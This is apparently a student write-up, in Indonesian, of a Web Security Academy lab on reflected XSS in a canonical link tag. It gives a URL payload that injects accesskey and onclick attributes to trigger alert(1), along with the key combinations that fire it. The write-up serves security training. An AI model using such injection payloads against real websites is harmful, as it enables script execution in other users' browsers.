# Lab 8 Reflected XSS in canonical link tag

## Brief:
situs ini mereflect user input di canonnical link tag dan mengescape angle bracket

## Tujuan:
lakukan alert() 

<img width="1917" height="1069" alt="brief" src="https://github.com/user-attachments/assets/4041371c-f28d-4632-b9b8-d78c4948e769" />

## Analisa:

1. masukan payload di url:

>     https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

> ini memastikan tombol x memiliki akses ke seluruh halaman ketika user menekan tombol akses fungsi alert muncul

<img width="1905" height="1079" alt="1 payload" src="https://github.com/user-attachments/assets/8cd30cb8-a993-46dc-8ea3-43a3cdf72aec" />

2. untuk mentrigger exploit

> di windows: Tekan ALT + SHIFT + X
>
> di mac	  : CTRL+ALT+X
>
> di Linux  : ALT + X

<img width="1919" height="1079" alt="2 exploit" src="https://github.com/user-attachments/assets/a9ac98aa-a7d5-4a20-bb48-73c7b4c35d40" />
